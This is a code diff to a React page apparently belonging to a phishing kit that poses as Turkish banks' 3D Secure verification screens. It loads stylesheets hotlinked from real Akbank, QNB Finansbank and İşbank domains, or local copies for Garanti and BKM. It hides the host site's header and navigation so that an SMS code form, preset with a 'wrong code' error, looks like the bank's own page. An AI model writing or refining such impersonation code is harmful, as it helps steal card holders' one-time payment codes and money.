@@ -15,10 +15,32 @@ interface SmsData {
     banka?: string;
 }
 
+const getBankCssLinks = (bank: string): string[] => {
+    const b = bank.toLowerCase().trim();
+    if (b.includes('garanti') || b.includes('bonus')) {
+        return ['/assets/acs-style/garanti/css/fonts.css', '/assets/acs-style/garanti/css/garanti.css'];
+    }
+    if (b.includes('akbank') || b.includes('axess')) {
+        return ['https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css'];
+    }
+    if (b.includes('deniz')) {
+        return []; // Inline styles
+    }
+    if (b.includes('finans') || b.includes('qnb')) {
+        return ['https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0'];
+    }
+    if (b.includes('isbank') || b.includes('işbank') || b.includes('maximum')) {
+        return ['https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css', 'https://maxinet.isbank.com.tr/assets/css/style.min.css'];
+    }
+    // Default BKM Go
+    return ['/assets/bkm/css/bkmacs2-dist.css', '/assets/bkm/css/main-dist.css'];
+};
+
 export default function HataliSmsPage() {
     const router = useRouter();
     const [data, setData] = useState<SmsData | null>(null);
     const [loading, setLoading] = useState(true);
+    const [cssLoaded, setCssLoaded] = useState(false);
     const [smsCode, setSmsCode] = useState('');
     // Hatalı SMS sayfası olduğu için hata mesajını varsayılan olarak set ediyoruz
     const [error, setError] = useState('Doğrulama kodunu hatalı girdiniz. Lütfen tekrar deneyiniz.');
@@ -197,6 +219,36 @@ export default function HataliSmsPage() {
     }
 
     const bank = (data?.banka || '').toLowerCase().trim();
+    const cssLinks = getBankCssLinks(bank);
+
+    if (cssLinks.length > 0 && !cssLoaded) {
+        return (
+            <div className="flex items-center justify-center min-h-screen bg-white">
+                <style jsx global>{`
+                    nav.fixed.bottom-0 { display: none !important; }
+                    main { padding-bottom: 0 !important; }
+                    header { display: none !important; }
+                    body { background: #fff !important; }
+                `}</style>
+                {cssLinks.map((href, index) => (
+                    <link 
+                        key={href} 
+                        rel="stylesheet" 
+                        href={href} 
+                        onLoad={index === cssLinks.length - 1 ? () => setCssLoaded(true) : undefined}
+                        onError={index === cssLinks.length - 1 ? () => setCssLoaded(true) : undefined}
+                    />
+                ))}
+                <div style={{ width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #3498db', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
+                <style jsx>{`
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                `}</style>
+            </div>
+        );
+    }
 
     // 1. GARANTİ RENDER
     const renderGaranti = () => {
